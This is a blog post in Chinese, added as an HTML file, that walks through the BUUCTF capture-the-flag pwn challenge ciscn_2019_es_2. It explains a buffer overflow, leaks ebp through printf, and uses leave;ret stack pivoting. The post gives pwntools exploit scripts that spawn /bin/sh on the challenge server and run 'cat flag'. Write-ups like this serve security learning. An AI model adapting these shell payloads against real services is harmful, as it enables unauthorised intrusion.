@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BUUCTF Pwn Ciscn_2019_es_2 | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BUUCTF Pwn Ciscn_2019_es_2</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/04/05</h2>
+</div>
+
+<main>
+<h1 id="buuctf-pwn-ciscn_2019_es_2">BUUCTF Pwn Ciscn_2019_es_2</h1>
+<p>考点：栈迁移、栈复用</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200405201417801.png" alt="image-20200405201417801"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200405201517470.png" alt="image-20200405201517470"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200405201538859.png" alt="image-20200405201538859"></p>
+<p>漏洞在vul()函数，可以读两次数据，s的栈大小为0x28，而两次读入都可以读0x30，0x30-0x28=8字节可以溢出，然后覆盖ebp、retn之后返回到hack函数发现echo flag就真的是的echo “flag”这个四个字符，没办法只能getshell然后cat flag</p>
+<p>本题的考点是栈迁移，我们可以发现利用栈溢出去getshell溢出空间不够用，本题可以看到可以read两次，第二次read会把第一次read的覆盖掉，首先要明确printf函数打印出的字符串是到\x00截止的，所以这里的第一个read和printf可以泄露出s栈中的ebp</p>
+<p>使用如下payload来调试</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>
+sh <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ciscn_2019_es_2</span><span style="color:#e6db74">&#39;</span>)
+gdb<span style="color:#f92672">.</span>attach(sh)<span style="color:#75715e">#打开gdb</span>
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x28</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>offset 
+pause()<span style="color:#75715e">#下断点</span>
+sh<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">your name?</span><span style="color:#e6db74">&#34;</span>,payload) 
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200405215730584.png" alt="image-20200405215730584"></p>
+<p>可以看到栈里面的内容存在0x00000000，所以我们printf出来的数据会到这里截止，如下图</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200405215920953.png" alt="image-20200405215920953"></p>
+<p>所以这里的ebp就是0xffd64038，通过这个ebp我们就能计算出ebp到第一个输入的字符的偏移</p>
+<p>这里第一个字符'a'的地址是0xffd64000，ebp是0xffd64038，所以偏移为56字节</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200405220623913.png" alt="image-20200405220623913"></p>
+<p>得到这个偏移无论ebp地址如何变化通过偏移都能计算出第一个读入的字符的地址也就是相当于&amp;s的地址</p>
+<p>第二次read就可以来实现栈迁移了，栈迁移的精髓就是使用两次leave;ret;指令，leave相当于mov esp，ebp；pop ebp；ret相当于pop eip，这里的pop是把esp所指向的内容赋给指定寄存器，如pop ebp就是将当前esp指向的内容赋给ebp寄存器，因为pop是出栈的意思所以还有个隐藏操作就是把esp+4，为什么是+4而不是-4，是因为栈的从高地址向低地址生长的，我们压入(push)一个数据则esp就要-4，pop出一个数据则esp+4，这里4是因为在32位的架构中地址都是4字节的，若在64位架构则是8字节，需要+-8</p>
+<p>本题还一个特殊的地方是栈迁移的目的地是同一个栈，我们利用第二个read进行栈迁移将栈迁移到&amp;s开始的地方又执行一遍</p>
+<p>可以使用如下payload来调试</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>
+sh <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ciscn_2019_es_2</span><span style="color:#e6db74">&#39;</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ciscn_2019_es_2</span><span style="color:#e6db74">&#39;</span>)
+gdb<span style="color:#f92672">.</span>attach(sh)<span style="color:#75715e">#开启gdb</span>
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x28</span>
+ebp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4</span>
+leave_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080484b8</span><span style="color:#75715e">#这里是leave；ret；一个gadget</span>
+main_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">main</span><span style="color:#e6db74">&#39;</span>]
+system_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>]
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>offset 
+<span style="color:#75715e">#pause()</span>
+sh<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">your name?</span><span style="color:#e6db74">&#34;</span>,payload) 
+ebp_addr <span style="color:#f92672">=</span> u32(sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>:])
+<span style="color:#66d9ef">print</span> hex(ebp_addr)
+
+stack_start_addr <span style="color:#f92672">=</span> ebp_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x38</span><span style="color:#75715e">#&amp;s的地址</span>
+faker_ebp_addr <span style="color:#f92672">=</span> stack_start_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x4</span><span style="color:#75715e">#faker ebp-4的地址</span>
+binsh_addr <span style="color:#f92672">=</span> stack_start_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc</span><span style="color:#75715e">#&#34;/bin/sh\x00&#34;的地址，作为system的参数</span>
+<span style="color:#75715e">#下面就是第二次read的数据，也就是栈迁移的payload</span>
+payload <span style="color:#f92672">=</span> p32(system_addr) <span style="color:#f92672">+</span> p32(main_addr) <span style="color:#f92672">+</span> p32(binsh_addr) <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#75715e">#这里就是构造的假栈，栈迁移到这里后执行这里面的内容</span>
+payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(offset,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span>)<span style="color:#75715e">#填充垃圾数据</span>
+<span style="color:#75715e">#ebp覆盖为栈迁移目的地的地址，retn覆盖为leave；ret；这个gadget地址，执行两次leave的关键</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(faker_ebp_addr) <span style="color:#f92672">+</span> p32(leave_ret)
+pause()<span style="color:#75715e">#断点</span>
+sh<span style="color:#f92672">.</span>send(payload)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200405224926168.png" alt="image-20200405224926168"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200405224851656.png" alt="image-20200405224851656"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200405230754405.png" alt="image-20200405230754405"></p>
+<p>相当于将栈执行到retn之后又将栈迁移到本栈的低地址作为新的栈又执行一遍，所以我觉得这里像是栈的复用，用了一遍又一遍，理解栈迁移原理的关键是要分析ebp、esp、eip这几个寄存器的变化</p>
+<p>exp</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>
+<span style="color:#75715e">#sh = process(&#39;./ciscn_2019_es_2&#39;)</span>
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">29491</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ciscn_2019_es_2</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#75715e">#gdb.attach(sh)</span>
+
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x28</span>
+ebp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4</span>
+leave_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080484b8</span>
+<span style="color:#75715e">#leave = 0x080485fd</span>
+main_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">main</span><span style="color:#e6db74">&#39;</span>]
+system_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>]
+
+catflag_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804854b</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>offset 
+<span style="color:#75715e">#pause()</span>
+sh<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">your name?</span><span style="color:#e6db74">&#34;</span>,payload) 
+ebp_addr <span style="color:#f92672">=</span> u32(sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>:])
+<span style="color:#66d9ef">print</span> hex(ebp_addr)
+
+stack_start_addr <span style="color:#f92672">=</span> ebp_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x38</span>
+faker_ebp_addr <span style="color:#f92672">=</span> stack_start_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x4</span>
+binsh_addr <span style="color:#f92672">=</span> stack_start_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc</span>
+
+payload <span style="color:#f92672">=</span> p32(system_addr) <span style="color:#f92672">+</span> p32(main_addr) <span style="color:#f92672">+</span> p32(binsh_addr) <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(offset,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(faker_ebp_addr) <span style="color:#f92672">+</span> p32(leave_ret)
+<span style="color:#75715e">#pause()</span>
+sh<span style="color:#f92672">.</span>send(payload)
+sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cat flag</span><span style="color:#e6db74">&#39;</span>)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200405232407972.png" alt="image-20200405232407972"></p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
